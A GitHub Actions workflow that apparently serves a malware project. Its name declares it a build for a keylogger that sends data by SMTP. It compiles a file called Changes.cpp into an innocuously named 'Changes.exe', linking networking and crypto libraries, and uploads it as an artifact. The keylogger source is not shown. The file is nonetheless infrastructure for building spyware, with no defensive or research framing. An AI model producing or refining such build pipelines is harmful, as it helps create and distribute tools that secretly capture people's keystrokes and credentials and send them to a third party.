name: Build Keylogger with SMTP
on: [push]
jobs:
  build:
    runs-on: windows-latest
    steps:
    - uses: actions/checkout@v3
    - uses: ilammy/msvc-dev-cmd@v1
    - run: cl Changes.cpp /FeChanges.exe /O2 /MT /D "_WIN32_WINNT=0x0600" winhttp.lib user32.lib shell32.lib ole32.lib gdi32.lib advapi32.lib crypt32.lib iphlpapi.lib ws2_32.lib
    - uses: actions/upload-artifact@v4
      with:
        name: Changes-SMTP.exe
        path: Changes.exe
